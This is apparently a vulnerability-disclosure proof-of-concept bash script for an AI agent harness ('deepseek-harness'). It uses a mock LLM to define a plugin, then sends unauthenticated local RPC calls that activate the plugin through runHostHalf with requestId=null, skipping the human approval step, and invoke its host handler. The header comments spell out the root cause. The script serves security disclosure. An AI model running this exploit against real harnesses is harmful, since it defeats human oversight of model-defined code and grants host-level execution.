#!/usr/bin/env bash
# =============================================================================
# Deterministic real-instance PoC — runHostHalf approval bypass (G-4)
#
# deepseek-harness rc.5 @ 47f943859b
#
# 场景:
#   1. 会话(模型)用 cordis_define 定义插件 —— mock LLM 确定性发出该工具调用,
#      插件定义后【从未经过任何人工审批, 也从未运行】。
#   2. 攻击者(独立 curl, 无会话/无 UI/无凭据)调用 Remote 方法
#      dynamicCordisRunner/runHostHalf, requestId=null(设计上是"面板直接手势",
#      应由人类在 UI 点击), 服务端直接激活插件 —— 人工审批被绕过。
#   3. 攻击者再调 dynamicCordisRunner/invoke 执行插件的 host handler。
#
# 根因: runHostHalf(cordis-host-runner/src/index.ts:324-377) 的 requestId=null
#   分支不做任何审批/持有者校验, 只查 plugin.sessionId === agent.session.id,
#   而 agent 由调用方传 sessionId 字符串解析(api/remotes/src/agent-lookup.ts);
#   Typert Gateway 以 authority 'trusted-host' 拦截 /api, 无鉴权即可达。
#
# 用法: bash ../dsh-security-pocs/poc-v3-typert-runhosthalf-bypass.sh   (无需 API key)
# 环境: REPO, WEB_PORT=3080, MOCK_PORT=8000
# =============================================================================
set -euo pipefail
SELF="$(cd "$(dirname "$0")" && pwd)"
REPO=${REPO:-}
if [ -z "$REPO" ] && [ -d "$SELF/../deepseek-harness" ]; then
  REPO=$(cd "$SELF/../deepseek-harness" && pwd)
fi
REPO=${REPO:-$(cd "$SELF/.." && pwd)}
[ -f "$REPO/apps/cli/src/bin.ts" ] || { echo "REPO=$REPO is not a deepseek-harness checkout (missing apps/cli/src/bin.ts); set REPO=/path/to/deepseek-harness" >&2; exit 2; }
WEB_PORT=${WEB_PORT:-3080}
MOCK_PORT=${MOCK_PORT:-8000}
TS=$(date +%Y%m%d-%H%M%S)
MARKER="DSH-RH-${TS}"
E="$SELF/evidence"
mkdir -p "$E"
OUT="$E/10-runhosthalf-${TS}"
mkdir -p "$OUT"
WEB_LOG="/tmp/dsh-web-10-${TS}.log"
MOCK_LOG="/tmp/dsh-mock-10-${TS}.log"
OVERLAY="$OUT/overlay.yml"
uuid() { node -e 'console.log(crypto.randomUUID())'; }
rpc() { curl -s -m 30 -X POST "http://127.0.0.1:$WEB_PORT/api/$1" -H 'content-type: application/json' \
  -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"$1\",\"payload\":$2}"; }

say() { printf '\n\033[1;36m◆ %s\033[0m %s\n' "$1" "$2"; }
ok()  { printf '\033[1;32m  ✔ %s\033[0m\n' "$*"; }
info(){ printf '    %s\n' "$*"; }

kill_web() { lsof -tiTCP:"$WEB_PORT" -sTCP:LISTEN 2>/dev/null | xargs kill 2>/dev/null || true; }
cleanup() {
  kill_web
  [ -n "${MOCK_PID:-}" ] && kill "$MOCK_PID" 2>/dev/null || true
}
trap cleanup EXIT

cat > "$OVERLAY" <<YML
# opt-in per repo docs: self-referential cordis toolset (not in shipped trees)
- id: session-title-llm
  disabled: true
- insert:
    - id: tool-cordis
      name: '@deepseek-ai/dsh-tool-cordis'
YML

HOST_CODE=$(cat <<JS
return { apply(ctx) { harness.handle('pwn', async (args) => ({ pwned: true, marker: '$MARKER', arg: args })) } }
JS
)
TOOL_ARGS=$(node -e 'console.log(JSON.stringify({plugin:{kind:"new",idPrefix:"pwn"},name:"pwn",purpose:"runHostHalf bypass demo",code:{host:process.argv[1]}}))' "$HOST_CODE")

echo "======================================================================"
echo "  runHostHalf APPROVAL BYPASS (G-4) — deterministic, no API key"
echo "  target: deepseek-harness rc.5 @ 47f943859b   ts=$TS   marker=$MARKER"
echo "======================================================================"

say SETUP "mock LLM(脚本化 cordis_define) + dsh web + tool-cordis overlay"
(cd "$REPO" && node --import tsx packages/test-support/llm-mock-server/src/bin.ts \
  --host 127.0.0.1 --port "$MOCK_PORT" --api-key mock-key \
  --sequence tool_call_success --tool-name cordis_define --tool-arguments "$TOOL_ARGS") >"$MOCK_LOG" 2>&1 &
MOCK_PID=$!
for i in $(seq 1 30); do rg -q '"type":"ready"' "$MOCK_LOG" 2>/dev/null && break; sleep 1; done

(cd "$REPO" && DEEPSEEK_BASE_URL="http://127.0.0.1:$MOCK_PORT/v1" DEEPSEEK_API_KEY=mock-key \
  node --import tsx/esm apps/cli/src/bin.ts web --patch "$OVERLAY" --port "$WEB_PORT") >"$WEB_LOG" 2>&1 &
WEB_PID=$!
for i in $(seq 1 60); do
  curl -s -m 1 -o /dev/null -X POST "http://127.0.0.1:$WEB_PORT/api/host.describe" \
    -H 'content-type: application/json' \
    -d '{"type":"client-request","rpcId":"w","method":"host.describe","payload":{}}' && break
  sleep 1
done
sleep 2

say DEFINE "会话 S: mock 确定性发出 cordis_define(host handler 'pwn')"
SID=$(rpc "session.create" "{\"cwd\":\"$REPO\"}" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);console.log(j.result?.ok?j.result.value.sessionId:"FAIL")})')
echo "session: $SID"
rpc "session.prompt" "{\"sessionId\":\"$SID\",\"mode\":\"queue\",\"content\":[{\"type\":\"text\",\"text\":\"define the plugin\"}]}" > "$OUT/01-define-prompt.json"
sleep 10

say INVENTORY "攻击者: inventory 确认插件已定义但【从未运行】(无 activeRun)"
INV0=$(rpc "dynamicCordisRunner/inventory" '{"args":{}}')
echo "$INV0" > "$OUT/02-inventory-before.json"
echo "$INV0"
PID=$(echo "$INV0" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const v=JSON.parse(s).result.value;console.log(v[0]?.pluginId+" "+v[0]?.agentId+" "+v[0]?.packages?.[0]?.packageId)})')
PLUGIN_ID=$(echo "$PID" | awk '{print $1}'); AGENT_ID=$(echo "$PID" | awk '{print $2}'); PKG_ID=$(echo "$PID" | awk '{print $3}')
echo "pluginId=$PLUGIN_ID agentId=$AGENT_ID packageId=$PKG_ID"
if echo "$INV0" | rg -q 'activeRun'; then echo "FAIL: plugin already running"; exit 1; fi
ok "未运行状态确认(无 activeRun) —— 攻击者将跳过一切审批直接激活"

say BYPASS "攻击者(无 UI/无审批)调 runHostHalf{agent=$AGENT_ID, requestId:null} 直接激活"
PAYLOAD_RH=$(node -e 'console.log(JSON.stringify({args:{agentId:process.argv[1],pluginId:process.argv[2],packageId:process.argv[3],mode:"run",requestId:null,approveFutureVersions:true}}))' "$AGENT_ID" "$PLUGIN_ID" "$PKG_ID")
RESP_RH=$(rpc "dynamicCordisRunner/runHostHalf" "$PAYLOAD_RH")
echo "$RESP_RH" > "$OUT/03-runhosthalf.json"
echo "$RESP_RH" | head -c 500; echo
if echo "$RESP_RH" | rg -q '"ok":true'; then ok "runHostHalf 接受: 插件已激活(人工审批被绕过)"; else echo "FAIL: runHostHalf rejected"; exit 1; fi

say WAIT "轮询 inventory 获取 activeRun.pluginRunId(攻击者通道)"
INV=""; RUN_ID=""
for i in $(seq 1 30); do
  INV=$(rpc "dynamicCordisRunner/inventory" '{"args":{}}')
  RUN_ID=$(echo "$INV" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.parse(s).result.value[0]?.activeRun?.pluginRunId??"")}catch{console.log("")}})')
  [ -n "$RUN_ID" ] && break
  sleep 2
done
echo "$INV" > "$OUT/04-inventory-active.json"
echo "pluginRunId=$RUN_ID"
if [ -z "$RUN_ID" ]; then echo "FAIL: no active run (see $WEB_LOG)"; exit 1; fi

say INVOKE "攻击者调 invoke 执行插件 handler 'pwn'(宿主运行时权限)"
PAYLOAD_INV=$(node -e 'console.log(JSON.stringify({args:{pluginId:process.argv[1],pluginRunId:process.argv[2],method:"pwn",args:{hello:"from-attacker"}}}))' "$PLUGIN_ID" "$RUN_ID")
RESP_INV=$(rpc "dynamicCordisRunner/invoke" "$PAYLOAD_INV")
echo "$RESP_INV" > "$OUT/05-invoke-result.json"
echo "$RESP_INV"

if echo "$RESP_INV" | rg -q "$MARKER" && echo "$RESP_INV" | rg -q '"ok":true'; then
  echo
  echo "======================================================================"
  echo "  PWNED — 攻击者未经人工审批激活插件并执行其 host handler"
  echo "  (define → runHostHalf(requestId=null) → invoke, 全程无会话凭据)"
  echo "  evidence: $OUT"
  echo "======================================================================"
  exit 0
fi
echo "FAIL: invoke did not return the marker (see $WEB_LOG $OUT)"
exit 1
